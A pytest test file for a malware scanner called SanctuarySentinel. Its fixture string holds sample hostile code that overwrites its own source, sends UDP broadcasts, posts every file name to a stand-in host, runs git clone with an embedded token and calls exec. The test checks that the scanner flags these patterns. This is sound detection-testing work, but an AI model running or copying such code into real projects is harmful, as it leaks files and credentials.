from __future__ import annotations

import json
from pathlib import Path

import pytest

from echo.sanctuary_sentinel import SanctuarySentinel, SentinelReport, main


def write_payload(tmp_path: Path, name: str, content: str) -> Path:
    path = tmp_path / name
    path.write_text(content, encoding="utf-8")
    return path


def test_sentinel_detects_incident_behaviours(tmp_path: Path) -> None:
    payload = """
import os
import requests
import socket

def mutate():
    with open(__file__, "w") as handle:
        handle.write("echo_cycle_1")

def broadcast():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"payload", ("255.255.255.255", 12345))

def sweep(root):
    for directory, _, files in os.walk(root):
        for file_name in files:
            requests.post("https://example.invalid", data=file_name)

def pat_clone():
    GITHUB_USER = "example-user"
    GITHUB_TOKEN = "ghp_example_pat"
    os.system(
        f"git clone https://{GITHUB_USER}:{GITHUB_TOKEN}@github.com/{GITHUB_USER}/repo.git"
    )

exec('class EchoResonance:\n pass')
"""
    write_payload(tmp_path, "payload.py", payload)

    sentinel = SanctuarySentinel(tmp_path)
    report = sentinel.scan()

    signatures = {finding.signature for finding in report.findings}
    assert {
        "network-broadcast",
        "self-modifying-source",
        "filesystem-sweep-exfil",
        "prompt-injection-exec",
        "credential-in-git-remote",
    } <= signatures
    assert report.highest_severity() == "critical"


def test_report_and_cli_serialisation(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    write_payload(tmp_path, "safe.py", "print('ok')\n")

    sentinel = SanctuarySentinel(tmp_path)
    report = sentinel.scan()
    assert isinstance(report, SentinelReport)
    assert report.is_clean()

    exit_code = main([str(tmp_path), "--format", "json"])
    assert exit_code == 0

    output = json.loads(capsys.readouterr().out)
    assert output["findings"] == []
    assert output["files_scanned"] >= 1
